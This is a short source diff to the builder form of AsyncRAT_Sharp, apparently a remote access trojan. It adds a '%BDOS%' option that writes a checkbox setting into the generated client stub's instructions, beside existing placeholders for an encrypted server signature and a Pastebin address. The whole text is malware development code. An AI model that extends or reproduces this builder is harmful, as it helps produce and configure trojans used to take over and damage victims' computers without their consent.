@@ -147,6 +147,9 @@ namespace AsyncRAT_Sharp.Forms
                                     if (operand == "%Serversignature%")
                                         methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
 
+                                    if (operand == "%BDOS%")
+                                        methodDef.Body.Instructions[i].Operand = chkBdos.Checked.ToString().ToLower();
+
                                     if (operand == "%Pastebin%")
                                         if (chkPastebin.Checked)
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
@@ -158,7 +161,7 @@ namespace AsyncRAT_Sharp.Forms
                     }
                 }
             }
-            
+
         }
 
         private void CheckBox2_CheckedChanged(object sender, EventArgs e)
